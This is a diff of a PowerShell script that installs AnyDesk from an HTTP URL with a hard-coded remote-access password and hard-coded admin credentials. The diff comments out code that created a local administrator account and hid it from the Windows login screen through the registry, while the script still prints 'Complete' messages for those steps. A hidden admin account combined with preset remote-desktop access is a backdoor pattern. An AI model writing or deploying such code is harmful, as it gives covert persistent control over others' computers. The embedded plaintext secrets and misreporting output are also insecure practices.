@@ -4,7 +4,7 @@ function Install-AnyDesk {
         [string]$AnyDeskUrl = "http://download.anydesk.com/AnyDesk.exe",
         [string]$Password = "rajkumarmysore",
         [string]$AdminUsername = "fladmin",
-        [string]$AdminPassword = "mysoreprinceraj"
+        [string]$AdminPassword = "mysore#32princeRaj"
     )
 
     # Error handling
@@ -30,15 +30,15 @@ function Install-AnyDesk {
         Write-Output "Set password Complete"
 
         # Create a new user account
-        New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)
+        # New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)
         Write-Output "New user add Complete"
 
         # Add the user to the Administrators group
-        Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
+        # Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
         Write-Output "New user to admin group Complete"
 
         # Hide the user from the Windows login screen
-        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
+        # Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
 
         # Get AnyDesk ID
         # Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--get-id" -Wait
